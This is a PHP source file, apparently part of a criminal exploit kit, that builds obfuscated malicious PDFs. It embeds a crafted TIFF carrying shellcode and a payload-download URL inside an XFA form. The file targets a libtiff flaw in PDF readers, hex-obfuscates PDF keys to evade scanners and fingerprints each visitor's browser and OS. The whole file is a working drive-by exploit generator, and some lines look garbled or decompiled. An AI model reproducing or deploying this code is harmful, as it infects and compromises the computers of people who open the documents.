<?php


class CPackExploits {
	var $ExploitID = null;
	var $ExploitFunctions = array(  );

	function GenTiff($os, $browser) {
		$url = $GLOBALS['cpXplHelper']->GetURL( 'libtiff', $GLOBALS['browser'], $GLOBALS['os'], 'libtiff' );
		$shellcode = 'ëZJ3Éf¹<€4
™âúëèëÿÿÿpL™™™Ãý8©™™™Ù•é…4Ù‘Aê¥í‡ášjç¹šb×ªtÏÎÈ¦šbkó—Àj?í‘ÀÆ^Ü{pÀÆÇTß½šZHxšXªPÿ‘ß…šZXx›šX™šZcn_—IóÀqÉ™™™_”ËÏfÎeÃAó˜Àq¤™™™_ŠÏß§ìc¯Çu¹Eó¹ÊfÎu^šÅø·ü^Ýšáü™™ªYÉÉÊÏÉfÎeEÉÊfÎiÉfÎmªY5Yì`ÈËÏÊfKÃÀ2{wªYZq¿fffÞüíÉëöúØýýëüêê™ÞüíÊàêíüôÝðëüúíöëàØ™Îð÷Üáüú™ÜáðíÍñëüøý™ÕöøýÕðûëøëàØ™ìëõôö÷™ÌËÕÝöî÷õöøýÍößðõüØ™' . $url . '€';
		$tiff = 'II*';
		$tiff .= pack( 'V', 8248 );
		$tiff .= str_repeat( '', 1500 );
		$tiff .= $shellcode;
		$tiff .= str_repeat( '', 8248 - 8 - strlen( $shellcode ) - 1500 );
		$tiff .= '';
		return $tiff;
	}

	function GetXML($randName, $os, $browser) {
		$xml = '<?xml version="1.0" encoding="UTF-8" ?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config xmlns="http://www.xfa.org/schema/xci/1.0/">
<present>
<pdf>
<version>1.65</version>
<interactive>1</interactive>
<linearized>1</linearized>
</pdf>
<xdp>
<packets>*</packets>
</xdp>
<destination>pdf</destination>
</present>
</config>
<template baseProfile="interactiveForms" xmlns="http://www.xfa.org/schema/xfa-template/2.4/">
<subform name="' . $randName[4] . '" layout="tb" locale="en_US">
<pageSet>
<pageArea id="' . $randName[2] . '" name="' . $randName[2] . '">
<contentArea name="' . $randName[3] . '" x="0pt" y="0pt" w="612pt" h="792pt" />
<medium short="612pt" long="792pt" stock="custom" />
</pageArea>
</pageSet>
<subform name="' . $randName[5] . '" x="0pt" y="0pt" w="612pt" h="792pt">
<break before="pageArea" beforeTarget="#' . $randName[2] . '" />
<bind match="none" />
<field name="' . $randName[1] . '" w="28.575mm" h="1.39mm" x="37.883mm" y="29.25mm">
<ui>
<imageEdit />
</ui>
</field>
<?templateDesigner expand 1?>
</subform>
<?templateDesigner expand 1?>
</subform>
<?templateDesigner FormTargetVersion 24?>
<?templateDesigner Rulers horizontal:1, vertical:1, guidelines:1, crosshairs:0?>
<?templateDesigner Zoom 94?>
</template>
<xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/">
<xfa:data>
<topmostSubform>
<' . $randName[1] . ' xfa:contentType="image/tif" href="">' . base64_encode( $this->GenTiff( $os, $browser ) ) . '</' . $randName[1] . '>
</topmostSubform>
</xfa:data>
</xfa:datasets>
<PDFSecurity xmlns="http://ns.adobe.com/xtd/" print="1" printHighQuality="1" change="1" modifyAnnots="1" formFieldFilling="1" documentAssembly="1" contentCopy="1" accessibleContent="1" metadata="1" />
<form checksum="a5Mpguasoj4WsTUtgpdudlf4qd4=" xmlns="http://www.xfa.org/schema/xfa-form/2.8/">
<subform name="' . $randName[4] . '">
<instanceManager name="_' . $randName[5] . '" />
<subform name="' . $randName[5] . '">
<field name="' . $randName[1] . '" />
</subform>
<pageSet>
<pageArea name="' . $randName[2] . '" />
</pageSet>
</subform>
</form>
</xdp:xdp>';
		return $xml;
	}

	function GenPDFXML($os, $browser) {
		$randVar = $GLOBALS['cpFunctions']->CreateArrayString( rand( 10, 30 ), '100' );
		$randName = $GLOBALS['cpFunctions']->CreateArrayString( rand( 10, 30 ), '100' );
		$RandomString = $randVar[1];
		CPackPDFObfuscator;
		$obf = new (  );
		$xml = $this->GetXML( $randName, $os, $browser );
		$pdf = $obf->rndSeparators( '%PDF-1.3', 0 );
		$pdf .= $obf->rndSeparators( '2 0 obj', 0 );
		$pdf .= $obf->rndSeparators( '<<' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'V' ), 1 ) . ' () ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Kids' ), 1 ) . ' [3 0 R] ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'T' ), 1 ) . ' (' . $randName[4] . '[0]) >>', 0 );
		$pdf .= $obf->rndSeparators( 'endobj', 0 );
		$pdf .= $obf->rndSeparators( '3 0 obj', 0 );
		$pdf .= $obf->rndSeparators( '<<' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Parent' ), 1 ) . ' 2 0 R ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Kids' ), 1 ) . ' [4 0 R] ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'T' ), 1 ) . ' (' . $randName[5] . '[0])>>', 0 );
		$pdf .= $obf->rndSeparators( 'endobj', 0 );
		$pdf .= $obf->rndSeparators( '4 0 obj', 0 );
		$pdf .= $obf->rndSeparators( '<<' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'P' ), 1 ) . ' 5 0 R ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'FT' ), 1 ) . ' ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Btn' ), 1 ) . ' ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'TU' ), 1 ) . ' (' . $randName[1] . ') ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Ff' ), 1 ) . ' 65536 ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Parent' ), 1 ) . ' 3 0 R ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'F' ), 1 ) . ' 4 ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Subtype' ), 1 ) . ' ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Widget' ), 1 ) . ' ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Type' ), 1 ) . ' ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Annot' ), 1 ) . ' ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'T' ), 1 ) . ' (' . $randName[1] . '[0]) ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Rect' ), 1 ) . ' 1111>>', 0 );
		$pdf .= $obf->rndSeparators( 'endobj', 0 );
		$pdf .= $obf->rndSeparators( '1 0 obj', 0 );
		$pdf .= $obf->rndSeparators( '<<' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Filter' ), 1 ) . ' [' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'FlateDecode' ), 1 ) . ' ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'ASCIIHexDecode' ), 1 ) . '] ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Length' ), 1 ) . ' ' . strlen( $xml ) . '>>', 0 );
		$pdf .= $obf->rndSeparators( 'stream', 0 );
		$pdf .= $obf->rndSeparators( gzcompress( bin2hex( $xml ), 9 ), 0 );
		$pdf .= $obf->rndSeparators( 'endstream', 0 );
		$pdf .= $obf->rndSeparators( 'endobj', 0 );
		$pdf .= $obf->rndSeparators( '5 0 obj', 0 );
		$pdf .= $obf->rndSeparators( '<<' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Rotate' ), 1 ) . ' 0 ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'CropBox' ), 1 ) . ' 1111 ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'MediaBox' ), 1 ) . ' 1111 ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Resources' ), 1 ) . ' <<' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'XObject' ), 1 ) . '>> ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Parent' ), 1 ) . ' 6 0 R ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Type' ), 1 ) . ' ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Page' ), 1 ) . '>>', 0 );
		$pdf .= $obf->rndSeparators( 'endobj', 0 );
		$pdf .= $obf->rndSeparators( '6 0 obj', 0 );
		$pdf .= $obf->rndSeparators( '<<' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Kids' ), 1 ) . ' [5 0 R] ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Type' ), 1 ) . ' ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Pages' ), 1 ) . ' ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Count' ), 1 ) . ' 1>>', 0 );
		$pdf .= $obf->rndSeparators( 'endobj', 0 );
		$pdf .= $obf->rndSeparators( '7 0 obj', 0 );
		$pdf .= $obf->rndSeparators( '<<' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'PageMode' ), 1 ) . ' ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'UseAttachments' ), 1 ) . ' ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Pages' ), 1 ) . ' 6 0 R ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'AcroForm' ), 1 ) . ' 8 0 R ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Type' ), 1 ) . ' ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Catalog' ), 1 ) . '>>', 0 );
		$pdf .= $obf->rndSeparators( 'endobj', 0 );
		$pdf .= $obf->rndSeparators( '8 0 obj', 0 );
		$pdf .= $obf->rndSeparators( '<<' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'XFA' ), 1 ) . ' [(' . $randName[0] . ') 1 0 R] ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Type' ), 1 ) . ' ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'EmbeddedFile' ), 1 ) . ' ' . $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Fields' ), 1 ) . ' [2 0 R]>>', 0 );
		$pdf .= $obf->rndSeparators( 'endobj', 0 );
		$pdf .= $obf->rndSeparators( '9 0 obj', 0 );
		$pdf .= $obf->rndSeparators( '<<', 0 );
		$pdf .= $obf->rndSeparators( $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Title' ), 1 ) . ' (' . $RandomString . ')', 0 );
		$pdf .= $obf->rndSeparators( $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Creator' ), 1 ) . ' (' . $RandomString . ')', 0 );
		$pdf .= $obf->rndSeparators( $obf->rndSeparators( '/' . $obf->HexObfuscate( 'CreationDate' ), 1 ) . ' (D:' . date( 'YmdHis' ) . ')', 0 );
		$pdf .= $obf->rndSeparators( $obf->rndSeparators( '/' . $obf->HexObfuscate( 'ModDate' ), 1 ) . ' (D:' . date( 'YmdHis' ) . ')', 0 );
		$pdf .= $obf->rndSeparators( $obf->rndSeparators( '/' . $obf->HexObfuscate( 'Author' ), 1 ) . ' (' . $RandomString . ')', 0 );
		$pdf .= $obf->rndSeparators( $obf->rndSeparators( '/' . $obf->HexObfuscate( 'CreationDate' ), 1 ) . ' (D:' . date( 'YmdHis' ) . ')', 0 );
		$pdf .= $obf->rndSeparators( '>>', 0 );
		$pdf .= $obf->rndSeparators( 'endobj', 0 );
		$xref = strlen( $pdf );
		$pdf .= $obf->rndSeparators( 'xref', 0 );
		$pdf .= $obf->rndSeparators( 'trailer', 0 );
		$pdf .= $obf->rndSeparators( '<</Root 7 0 R /Size 9 /Info 9 0 R>>', 0 );
		$pdf .= $obf->rndSeparators( 'startxref', 0 );
		$pdf .= $obf->rndSeparators( $xref, 0 );
		$pdf .= $obf->rndSeparators( '%%EOF', 0 );
		return $pdf;
	}
}

include( 'CP-ENC-1633.php' );
include( 'CP-ENC-1993.php' );
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$browser = $cpFunctions->GetBrowser( $user_agent );
$os = $cpFunctions->GetOS( $user_agent );
?>
